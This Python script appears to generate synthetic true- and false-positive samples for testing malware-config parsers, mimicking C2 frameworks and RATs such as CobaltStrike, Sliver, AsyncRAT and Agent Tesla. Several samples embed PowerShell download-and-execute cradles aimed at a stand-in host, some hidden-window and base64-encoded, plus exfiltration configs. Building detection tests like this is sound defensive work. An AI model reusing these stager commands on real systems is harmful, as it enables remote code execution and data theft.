#!/usr/bin/env python3
"""
Generate synthetic TP (True Positive) and FP (False Positive) test samples
for mwcp parser lab validation.

All samples are synthetic -- they embed the exact structural indicators each
parser uses for detection (binary structures, protocol field names, wire-format
patterns) but contain no actual malware.  Run this once before running the
parser tests; the pytest fixture auto-invokes it if samples are absent.

Usage:
    python generate_samples.py
"""
import base64
import hashlib
import json
import os
import struct

HERE = os.path.dirname(os.path.abspath(__file__))
TP = os.path.join(HERE, 'samples', 'tp')
FP = os.path.join(HERE, 'samples', 'fp')


def _write(path: str, data) -> None:
    if isinstance(data, str):
        data = data.encode('utf-8')
    with open(path, 'wb') as fh:
        fh.write(data)
    print(f'  {os.path.relpath(path, HERE)} ({len(data)} bytes)')


def _mz(payload: bytes, pad: int = 512) -> bytes:
    return b'MZ' + b'\x90' * (pad - 2) + payload


# ---------------------------------------------------------------------------
# TP: CobaltStrike
# XOR-encoded config block with all required structural fields.
# ---------------------------------------------------------------------------
def _tp_cobaltstrike() -> bytes:
    def s16(id_, val):
        return struct.pack('>HHH', id_, 1, 2) + struct.pack('>H', val)
    def s32(id_, val):
        return struct.pack('>HHH', id_, 2, 4) + struct.pack('>I', val)
    def sstr(id_, val):
        b = val.encode('utf-8') + b'\x00'
        return struct.pack('>HHH', id_, 3, len(b)) + b

    block = b''
    block += s16(1, 0)           # BeaconType: HTTP
    block += s16(2, 443)         # Port
    block += s32(3, 5000)        # SleepTime: 5000ms
    block += s16(5, 30)          # Jitter: 30%
    block += sstr(7, 'c2.lab.test,/gate.php')
    block += sstr(8, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    block += sstr(11, '%windir%\\sysnative\\svchost.exe')
    block += sstr(50, '\\\\.\\pipe\\msagent_b4f7')
    block += struct.pack('>HHH', 0, 0, 0)  # end sentinel

    key = 0x69
    encoded = bytes(b ^ key for b in block)
    return _mz(b'\x00' * 256 + encoded)


# ---------------------------------------------------------------------------
# TP: Sliver
# Wire-protocol JSON fields + mtls:// transport scheme.
# ---------------------------------------------------------------------------
def _tp_sliver() -> bytes:
    config = {
        'implant_name': 'BLUE_PHANTOM',
        'c2s': [{'url': 'mtls://c2.lab.test:8888'}],
        'reconnect_interval': 60,
        'server_url': 'mtls://c2.lab.test:8888',
        'dns_c2s': [],
        'ActiveC2': 'mtls://c2.lab.test:8888',
        'MaxConnectionErrors': 1000,
        'PollTimeout': 360,
    }
    payload = json.dumps(config).encode('utf-8')
    payload += b'\x00"implant_name"\x00mtls://\x00'
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: Havoc
# 0xDEADBEEF magic + valid config_size + C2 URL in config region.
# ---------------------------------------------------------------------------
def _tp_havoc() -> bytes:
    magic       = b'\xde\xad\xbe\xef'
    config_size = struct.pack('<I', 64)
    agent_id    = struct.pack('<I', 0xABCD1234)
    sleep       = struct.pack('<I', 5)
    jitter      = struct.pack('<I', 20)
    c2_region   = b'https://c2.lab.test/profile\x00' + b'\x00' * 32
    payload = magic + config_size + agent_id + sleep + jitter + c2_region
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: BruteRatel
# Named pipe \\.\\pipe\\ratel (SMB C2 protocol-required).
# ---------------------------------------------------------------------------
def _tp_bruteratel() -> bytes:
    payload = (
        b'\x00' * 64 +
        b'\\\\.\\pipe\\ratel\x00' +
        b'https://c2.lab.test/badger_profile\x00' +
        b'\x00' * 32
    )
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: Mythic
# PayloadUUID + callback_interval (2 required protocol field names).
# ---------------------------------------------------------------------------
def _tp_mythic() -> bytes:
    config = {
        'PayloadUUID': 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
        'callback_interval': 60,
        'callback_jitter': 23,
        'AES_PSK': 'LabTestAESKeyBase64=',
        'c2_profiles': [{'name': 'http', 'parameters': {
            'callback_host': 'http://c2.lab.test',
            'callback_port': 80,
        }}],
        'kill_date': '2099-12-31',
    }
    return _mz(b'\x00' * 256 + json.dumps(config).encode('utf-8'))


# ---------------------------------------------------------------------------
# TP: Merlin
# Wire-protocol JSON fields: "psk", "skew", "maxRetry", "proto", "padding"
# ---------------------------------------------------------------------------
def _tp_merlin() -> bytes:
    config = {
        'psk':      'LabTestPreSharedKey01234567890',
        'skew':     3000,
        'maxRetry': 7,
        'proto':    'https',
        'padding':  4096,
        'url':      'https://c2.lab.test/merlin',
        'ja3':      '769,47-53-5-10-49161-49162-49171-49172,0-10-11,23-24-25,0',
    }
    return _mz(b'\x00' * 256 + json.dumps(config).encode('utf-8'))


# ---------------------------------------------------------------------------
# TP: PoshC2 (PS1)
# $server + $URLS + $kill_date = 3 of the _POSH_MARKERS (need >= 2)
# ---------------------------------------------------------------------------
def _tp_posh_c2() -> bytes:
    return b"""\
$server = "https://c2.lab.test"
$URLS = @("/index.php", "/news.php", "/status.php")
$Payload = "IEX (New-Object Net.WebClient).DownloadString"
$PayloadComms = "$server/comms.php"
$kill_date = "2099-12-31"
$sleep_time = 5
$jitter_time = 0.2
$proxy_url = ""
$proxy_username = ""
$proxy_password = ""
"""


# ---------------------------------------------------------------------------
# TP: NjRAT
# Pipe-delimited plaintext config: host|port|key|name|campaign|
# ---------------------------------------------------------------------------
def _tp_njrat() -> bytes:
    config = b'c2.lab.test|4444|SOFTWARE\\Microsoft\\Windows|MutexABC|Campaign1|\x00'
    return _mz(b'\x00' * 256 + config)


# ---------------------------------------------------------------------------
# TP: AsyncRAT
# .NET string cluster: Hosts + Ports + Version + Mutex + Certificate +
#                       Group + Delay + Install + Anti + BDOS (>= 3 in 4KB)
# ---------------------------------------------------------------------------
def _tp_asyncrat() -> bytes:
    cluster = b''.join([
        b'Hosts\x00\x04c2.lab.test\x00',
        b'Ports\x00\x044444\x00',
        b'Version\x00\x040.5.8\x00',
        b'Mutex\x00\x04AsyncMutex_a8f3b2\x00',
        b'Certificate\x00\x04MIID_placeholder\x00',
        b'BDOS\x00\x04False\x00',
        b'Group\x00\x04TestTargets\x00',
        b'Delay\x00\x043000\x00',
        b'Install\x00\x04False\x00',
        b'Anti\x00\x04False\x00',
    ])
    return _mz(b'\x00' * 128 + cluster)


# ---------------------------------------------------------------------------
# TP: TelegramC2
# Bot token in exact Telegram API format: <8-10 digits>:<35 chars>
# ---------------------------------------------------------------------------
def _tp_telegram() -> bytes:
    token = b'1234567890:ABCDEFGHijklmnopqrstuvwxyz_abcde'
    return (
        b'bot_token = "' + token + b'"\n' +
        b'chat_id = -100987654321\n' +
        b'https://api.telegram.org/bot' + token + b'/sendMessage\n'
    )


# ---------------------------------------------------------------------------
# TP: SMTPExfil
# SMTP host + port + email + password all within 512 bytes
# ---------------------------------------------------------------------------
def _tp_smtp_exfil() -> bytes:
    payload = (
        b'\x00smtp.lab.test\x00'
        b'\x00587\x00'
        b'exfil@lab.test\x00'
        b'password:L4bP4ssw0rd\x00'
    )
    return _mz(b'\x00' * 128 + payload)


# ---------------------------------------------------------------------------
# TP: GenericMutex
# CreateMutexA API near a hex-token string (triggers both code paths)
# ---------------------------------------------------------------------------
def _tp_generic_mutex() -> bytes:
    payload = (
        b'\x00' * 64 +
        b'CreateMutexA\x00' +
        b'A1B2C3D4E5F6\x00' +     # 12-char hex token
        b'\x00' * 32
    )
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: GenericC2
# Non-private IP:port and non-benign URL (TEST-NET-1 documentation range)
# ---------------------------------------------------------------------------
def _tp_generic_c2() -> bytes:
    payload = (
        b'http://192.0.2.1:4444/gate.php\x00'   # non-private IP
        b'192.0.2.1:4444\x00'
    )
    return _mz(b'\x00' * 128 + payload)


# ---------------------------------------------------------------------------
# TP: PowerShellDecoder
# -enc flag + valid base64-encoded UTF-16LE PowerShell command
# ---------------------------------------------------------------------------
def _tp_ps_decoder() -> bytes:
    ps_cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://c2.lab.test/stg")'
    ps_b64 = base64.b64encode(ps_cmd.encode('utf-16-le')).decode('ascii')
    line = f'powershell.exe -NoProfile -WindowStyle Hidden -enc {ps_b64}\n'
    return line.encode('utf-8')


# ---------------------------------------------------------------------------
# TP: LNKParser
# Minimal valid MS-SHLLINK file with COMMAND_LINE_ARGUMENTS containing a URL.
# ---------------------------------------------------------------------------
def _tp_lnk() -> bytes:
    # Header (76 bytes per MS-SHLLINK spec)
    # link_flags: HasStringData (bit2) + IsUnicode (bit7) + HasArguments (bit11)
    # = 0x04 | 0x80 | 0x800 = 0x884
    header = struct.pack('<I', 0x4C)                                          # HeaderSize
    header += b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46'  # LinkCLSID
    header += struct.pack('<I', 0x884)                                        # LinkFlags
    header += struct.pack('<I', 0x20)                                         # FileAttributes
    header += b'\x00' * 24                                                    # 3x FILETIME
    header += struct.pack('<I', 0)                                            # FileSize
    header += struct.pack('<I', 0)                                            # IconIndex
    header += struct.pack('<I', 1)                                            # ShowCommand
    header += b'\x00' * 2                                                     # HotKey
    header += b'\x00' * 2                                                     # Reserved1
    header += b'\x00' * 4                                                     # Reserved2
    header += b'\x00' * 4                                                     # Reserved3
    assert len(header) == 76

    # StringData: COMMAND_LINE_ARGUMENTS (Unicode, count = number of chars)
    args = 'powershell.exe -NoProfile -WindowStyle Hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://c2.lab.test/payload\')"'
    args_utf16 = args.encode('utf-16-le')
    count = len(args)          # number of characters, NOT bytes
    string_data = struct.pack('<H', count) + args_utf16

    return header + string_data


# ---------------------------------------------------------------------------
# TP: DiscordExfilConfig
# Webhook URL in exact Discord API format: /api/webhooks/<snowflake>/<token>
# ---------------------------------------------------------------------------
def _tp_discord() -> bytes:
    # Server ID: Discord Snowflake (18 digits); token: 68 alphanumeric chars
    webhook = (b'https://discord.com/api/webhooks/123456789012345678/'
               b'LabTestWebhookTokenABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghij')
    return (
        b'# Exfil config\n'
        b'webhook_url = "' + webhook + b'"\n'
        b'chat_id = 987654321\n'
    )


# ---------------------------------------------------------------------------
# TP: DcRATConfig
# AsyncRAT base cluster + HVNC + Serversignature (DcRAT-specific markers)
# ---------------------------------------------------------------------------
def _tp_dcrat() -> bytes:
    cluster = b''.join([
        b'Hosts\x00\x04c2.lab.test\x00',
        b'Ports\x00\x044444\x00',
        b'Version\x00\x041.0.7\x00',
        b'Mutex\x00\x04DcMutex_LabTest\x00',
        b'Certificate\x00\x04MIID_lab_cert\x00',
        b'HVNC\x00\x04True\x00',
        b'Serversignature\x00\x04LabServerSig2024ABCDEFGH==\x00',
        b'Group\x00\x04LabCampaign\x00',
        b'Delay\x00\x043000\x00',
        b'Install\x00\x04False\x00',
        b'Anti\x00\x04False\x00',
    ])
    return _mz(b'\x00' * 128 + cluster)


# ---------------------------------------------------------------------------
# TP: XWormConfig
# "XWorm V5.6" marker + key cluster with XWorm-specific field names
# ---------------------------------------------------------------------------
def _tp_xworm() -> bytes:
    cluster = b''.join([
        b'XWorm V5.6\x00',
        b'Hosts\x00\x04c2.lab.test\x00',
        b'Ports\x00\x044444\x00',
        b'Ver\x00\x045.6\x00',
        b'Mutex\x00\x04XWormMutex_LabTest\x00',
        b'BSOD\x00\x04False\x00',
        b'Hwid\x00\x04LAB-HWID-001\x00',
        b'Group\x00\x04XWormLab\x00',
        b'Delay\x00\x043000\x00',
        b'Pastebin\x00\x04null\x00',
    ])
    return _mz(b'\x00' * 128 + cluster)


# ---------------------------------------------------------------------------
# TP: QuasarRATConfig
# Port (singular, not Ports) + Password + Tag cluster = Quasar fingerprint
# ---------------------------------------------------------------------------
def _tp_quasarrat() -> bytes:
    cluster = b''.join([
        b'Hosts\x00\x04c2.lab.test\x00',
        b'Port\x00\x044444\x00',       # singular -- DcRAT/AsyncRAT use "Ports"
        b'Password\x00\x04QuasarLabPass2024!\x00',
        b'Mutex\x00\x04{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}\x00',
        b'Tag\x00\x04LabTarget\x00',
        b'ShowConsole\x00\x04False\x00',
        b'LogDirectoryName\x00\x04Logs\x00',
        b'Version\x00\x041.3.0.0\x00',
    ])
    return _mz(b'\x00' * 128 + cluster)


# ---------------------------------------------------------------------------
# TP: AgentTeslaConfig
# "Agent Tesla" product string + keylogger import + SMTP exfil config
# ---------------------------------------------------------------------------
def _tp_agenttesla() -> bytes:
    payload = b''.join([
        b'Agent Tesla\x00',
        b'GetKeyboardState\x00',
        b'ProductionModeKey\x00',
        b'smtp.lab.test\x00',
        b'587\x00',
        b'from@lab.test\x00',
        b'to@analyst.test\x00',
        b'password:ATLabPass2024!\x00',
    ])
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: AdaptixC2Config
# JSON with agent_id + callback_url + profile (Adaptix protocol-required)
# ---------------------------------------------------------------------------
def _tp_adaptix() -> bytes:
    config = json.dumps({
        'agent_id':         'AABBCCDD11223344',
        'callback_url':     'https://c2.lab.test/adaptix',
        'profile':          'http-adaptix-profile',
        'callback_interval': 30,
        'callback_jitter':  10,
    }).encode('utf-8')
    return _mz(b'\x00' * 256 + config)


# ---------------------------------------------------------------------------
# TP: PowGratConfig (PS1)
# $C2Server + $C2Port + $Password variable cluster
# ---------------------------------------------------------------------------
def _tp_powgrat() -> bytes:
    return b"""\
$C2Server = "https://c2.lab.test"
$C2Port = "443"
$Password = "PowGratLabPass2024"
$SleepTime = 5
$Jitter = 0.2
"""


# ---------------------------------------------------------------------------
# FP samples -- should NOT produce meaningful IOC findings
# ---------------------------------------------------------------------------

def _fp_benign_pe() -> bytes:
    # MZ + NOP sled: no strings, no config structure, no hex tokens
    return b'MZ' + b'\x90' * 1022


def _fp_benign_json() -> bytes:
    # JSON API response with some similar field names but not a C2 config
    data = {
        'server_url': 'https://api.myapp.example.com/v2',
        'c2': 'tier2',         # short string, no mtls:// etc
        'interval': 30,
        'retry_count': 3,
        'name': 'myservice',
        'version': '1.0.0',
    }
    return json.dumps(data, indent=2).encode('utf-8')


def _fp_benign_ps1() -> bytes:
    # Legitimate admin PS script: no -enc, no IEX cradles, no C2 markers
    return b"""\
# Backup script - no malware indicators
param([string]$Source = "C:\\Data", [string]$Dest = "D:\\Backup")
Get-ChildItem $Source -Recurse | ForEach-Object {
    $target = $_.FullName.Replace($Source, $Dest)
    Copy-Item $_.FullName $target -Force
    Write-Output "Copied: $($_.Name)"
}
"""


def _fp_smtp_reference() -> bytes:
    # SMTP config reference without any credentials or email addresses
    return b"""\
# Mail server configuration for outbound notifications
smtp_host = smtp.office365.com
smtp_port = 587
use_tls = true
# User must provide login via application configuration manager
"""


def _fp_log_csv() -> bytes:
    # Pipe-delimited log that is NOT a NjRAT config (2nd field is non-numeric label)
    return b"""\
Date|Event|Status|Duration|Notes
2024-01-01|startup|ok|90s|no issues
2024-01-02|shutdown|ok|120s|maintenance window
2024-01-03|restart|warn|45s|brief interruption
"""


def _fp_benign_binary() -> bytes:
    # Deterministic binary with no printable ASCII runs (no strings extracted)
    seed = hashlib.sha256(b'benign-lab-fp-sample').digest()
    raw = (seed * 40)[:512]
    # Force all bytes outside printable ASCII range to avoid _ASCII_RE matches
    masked = bytes(b | 0x80 for b in raw)
    return b'MZ' + masked[:510]


def _fp_discord_mention() -> bytes:
    # Mentions "discord" but has NO webhook URL -- should not trigger
    return b"""\
# Status notification config
notify_channel = discord
channel_name = "#ops-alerts"
server = my-discord-server
# No webhook configured -- use manual posting
"""


def _fp_email_notify_ps1() -> bytes:
    # Legitimate SMTP notification script -- no Agent Tesla markers,
    # no keylogger imports, no "Agent Tesla" string
    return b"""\
# Email alert script for monitoring
param([string]$Recipient = "admin@company.com")
$SmtpServer = "smtp.office365.com"
$SmtpPort   = 587
$From       = "monitor@company.com"
$Subject    = "Alert: Disk space low"
$Body       = "Disk space on $env:COMPUTERNAME is below 10%"
Send-MailMessage -To $Recipient -From $From -Subject $Subject `
    -Body $Body -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl
"""


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    os.makedirs(TP, exist_ok=True)
    os.makedirs(FP, exist_ok=True)

    print('[TP samples]')
    _write(os.path.join(TP, 'cobalt_strike.bin'),      _tp_cobaltstrike())
    _write(os.path.join(TP, 'sliver_implant.bin'),     _tp_sliver())
    _write(os.path.join(TP, 'havoc_daemon.bin'),       _tp_havoc())
    _write(os.path.join(TP, 'brute_ratel.bin'),        _tp_bruteratel())
    _write(os.path.join(TP, 'mythic_agent.bin'),       _tp_mythic())
    _write(os.path.join(TP, 'merlin_agent.bin'),       _tp_merlin())
    _write(os.path.join(TP, 'posh_c2.ps1'),            _tp_posh_c2())
    _write(os.path.join(TP, 'njrat_config.bin'),       _tp_njrat())
    _write(os.path.join(TP, 'asyncrat_config.bin'),    _tp_asyncrat())
    _write(os.path.join(TP, 'telegram_c2.txt'),        _tp_telegram())
    _write(os.path.join(TP, 'smtp_exfil.bin'),         _tp_smtp_exfil())
    _write(os.path.join(TP, 'generic_mutex.bin'),      _tp_generic_mutex())
    _write(os.path.join(TP, 'generic_c2.bin'),         _tp_generic_c2())
    _write(os.path.join(TP, 'ps_decoder.ps1'),         _tp_ps_decoder())
    _write(os.path.join(TP, 'lnk_payload.lnk'),        _tp_lnk())
    # New parsers
    _write(os.path.join(TP, 'discord_webhook.txt'),    _tp_discord())
    _write(os.path.join(TP, 'dcrat_config.bin'),       _tp_dcrat())
    _write(os.path.join(TP, 'xworm_config.bin'),       _tp_xworm())
    _write(os.path.join(TP, 'quasarrat_config.bin'),   _tp_quasarrat())
    _write(os.path.join(TP, 'agenttesla_config.bin'),  _tp_agenttesla())
    _write(os.path.join(TP, 'adaptix_config.bin'),     _tp_adaptix())
    _write(os.path.join(TP, 'powgrat_stager.ps1'),     _tp_powgrat())

    print('[FP samples]')
    _write(os.path.join(FP, 'benign_pe.bin'),          _fp_benign_pe())
    _write(os.path.join(FP, 'benign_json.json'),       _fp_benign_json())
    _write(os.path.join(FP, 'benign_ps1.ps1'),         _fp_benign_ps1())
    _write(os.path.join(FP, 'smtp_reference.txt'),     _fp_smtp_reference())
    _write(os.path.join(FP, 'log_csv.csv'),            _fp_log_csv())
    _write(os.path.join(FP, 'benign_binary.bin'),      _fp_benign_binary())
    _write(os.path.join(FP, 'discord_mention.txt'),    _fp_discord_mention())
    _write(os.path.join(FP, 'email_notify.ps1'),       _fp_email_notify_ps1())

    print('Done.')


if __name__ == '__main__':
    main()
